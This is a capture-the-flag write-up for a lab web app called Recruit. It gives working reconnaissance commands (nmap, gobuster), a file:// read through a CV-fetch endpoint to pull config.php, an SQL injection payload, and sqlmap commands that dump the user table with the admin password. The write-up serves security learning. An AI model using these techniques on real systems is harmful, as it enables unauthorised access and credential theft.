# Recruit
Recruit has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.

Can you gain an initial foothold, escalate your access, and ultimately log in as the administrator?
Answer the questions below

**What is the flag value after logging in as a normal user?**

**What is the flag value after logging in as admin?**

---

Let's start with some basic reconnisance to discover some secrets!


**nmap -sS 10.81.182.40**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-02 11:12 -0400
Nmap scan report for 10.81.182.40
Host is up (0.031s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```
after using nmap I have found 3 open ports. Port 80 takes us to a login page! Time to enumerate some directories!

**gobuster dir -w raft-medium-directories.txt -u http://10.81.182.40 -x html, php, txt, js**
```
assets               (Status: 301) [Size: 313] [--> http://10.81.182.40/assets/]
mail                 (Status: 301) [Size: 311] [--> http://10.81.182.40/mail/]
javascript           (Status: 301) [Size: 317] [--> http://10.81.182.40/javascript/]
phpmyadmin           (Status: 301) [Size: 317] [--> http://10.81.182.40/phpmyadmin/]
server-status        (Status: 403) [Size: 277]
Progress: 89997 / 89997 (100.00%)
```

Mail look's intresting lets check it out!
```
Hi Team,

Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

Weâ€™ve completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.

Please let us know if there are any issues or if further changes
are required.

Thanks,
HR Operations
Recruitment Team
```
We have recived the first part of the puzzle, the username! It say's the password is in config.php but after check I found out the page is blank. There must be another way to view it. After checking out other pages that I'm allowed to view I find a intresting snippet on the API page. ```You can fetch a candidate CV using the following endpoint:
/file.php?cv=<URL>``` So with this infomation I assumed you can grab the contents of the config.php from the API. 
```http://10.81.182.40/file.php?cv=file://config.php``` I was right, and I finally recievded the password for HR **hr########d123** 

After logging in we get the first flag and access to the dashboard.

Now I am on the second part of the puzzle, getting the admin login!
there's nothing intresting on this page besides a search bar. I tried some xss payloads which failed. then I tried some SQL payloads. 

**PAYLOAD USED:** ' OR 1=1--

```
SQL Error:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```
which gave me a error message, which indicates it's a sql vulenabilitie!

I used sqlmap to dump the database to try and find some secrets!

**SQLMAP :** sqlmap -u "http://10.81.182.40/dashboard.php?search" --cookie="PHPSESSID=44m0seitiqso7im6g91e3se9iq" --forms --crawl=2 -D database --dbs

which gave me:
```
[12:04:12] [WARNING] reflective value(s) found and filtering out
available databases [6]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] recruit_db
[*] sys
```
Perfect it works! time to dump some tables!

**SQLMAP :** sqlmap -u "http://10.81.182.40/dashboard.php?search" --cookie="PHPSESSID=44m0seitiqso7im6g91e3se9iq" --forms --crawl=2 -D recruit_db --dump-all --dbs

which gave me:
```
Database: recruit_db
Table: users
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | admi#####admin | admin    |
+----+----------------+----------+

[12:15:05] [INFO] table 'recruit_db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.81.182.40/dump/recruit_db/users.csv'                                                            
[12:15:05] [INFO] fetching columns for table 'candidates' in database 'recruit_db'
[12:15:05] [INFO] fetching entries for table 'candidates' in database 'recruit_db'
Database: recruit_db
Table: candidates
[4 entries]
+----+---------------+--------------+--------------------+
| id | name          | status       | position           |
+----+---------------+--------------+--------------------+
| 1  | Alice Johnson | Approved     | Frontend Developer |
| 2  | Bob Smith     | Under Review | Backend Developer  |
| 3  | Charlie Brown | Rejected     | Security Analyst   |
| 4  | Diana Prince  | Selected     | HR Executive       |
+----+---------------+--------------+--------------------+
```
I got the admin login! After logging in with the admin details I got the final flag!



